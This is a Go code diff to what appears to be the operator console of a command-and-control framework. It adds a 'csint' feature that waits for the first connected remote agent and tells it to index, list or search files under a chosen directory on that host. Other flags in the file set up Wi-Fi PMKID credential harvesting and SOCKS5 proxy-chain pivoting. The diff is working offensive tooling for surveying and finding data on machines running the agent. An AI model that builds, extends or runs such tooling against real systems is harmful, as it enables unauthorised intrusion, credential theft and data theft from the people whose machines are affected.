@@ -184,6 +184,10 @@ func main() {
 	proxyChain := flag.String("proxy-chain", "", "SOCKS5 chain spec: host1:port1,host2:port2,...")
 	proxyChainTarget := flag.String("proxy-chain-target", "", "final target host:port (optional)")
 	proxyChainTimeout := flag.Int("proxy-chain-timeout", 15, "per-hop timeout (seconds)")
+	csintAction := flag.String("csint", "", "content-source intel: index|search|list")
+	csintRoot := flag.String("csint-root", "", "directory to index")
+	csintQuery := flag.String("csint-query", "", "search query")
+	csintIndexPath := flag.String("csint-index", "", "index file path (default: <root>/.rs_csint.json)")
 	pmkidIface := flag.String("pmkid", "", "802.11 PMKID harvest: monitor-mode iface")
 	pmkidChannel := flag.Int("pmkid-channel", 0, "PMKID: set wifi channel before harvest")
 	pmkidDuration := flag.Duration("pmkid-duration", 60*time.Second, "PMKID: total harvest run time")
@@ -651,6 +655,16 @@ func main() {
 			Hops:    hops,
 			Target:  *proxyChainTarget,
 			Timeout: *proxyChainTimeout,
+		})
+	}
+
+	// csint dispatch — content-source intelligence on the first agent
+	if *csintAction != "" {
+		go runCSIntDispatch(mgr, csintArgs{
+			Action:    *csintAction,
+			Root:      *csintRoot,
+			Query:     *csintQuery,
+			IndexPath: *csintIndexPath,
 		})
 	}
 
@@ -1658,5 +1672,33 @@ func runProxyChainDispatch(mgr *session.Manager, a proxyChainArgs) {
 	}
 	if err := s.SendProxyChainStart(sessionID, req); err != nil {
 		log.Printf("[proxychain] start: %v", err)
+	}
+}
+
+// csintArgs carries the operator's -csint* flags.
+type csintArgs struct {
+	Action    string
+	Root      string
+	Query     string
+	IndexPath string
+}
+
+// runCSIntDispatch waits for the first agent, sends a CSIntStart.
+func runCSIntDispatch(mgr *session.Manager, a csintArgs) {
+	for len(mgr.Sessions()) == 0 {
+		time.Sleep(500 * time.Millisecond)
+	}
+	s := mgr.Sessions()[0]
+	sessionID := fmt.Sprintf("ci-%d", time.Now().UnixNano())
+	log.Printf("[csint] %s root=%q query=%q -> %s", a.Action, a.Root, a.Query, s.AgentID)
+	req := proto.CSIntStart{
+		SessionID: sessionID,
+		Action:    a.Action,
+		Root:      a.Root,
+		Query:     a.Query,
+		IndexPath: a.IndexPath,
+	}
+	if err := s.SendCSIntStart(sessionID, req); err != nil {
+		log.Printf("[csint] start: %v", err)
 	}
 }
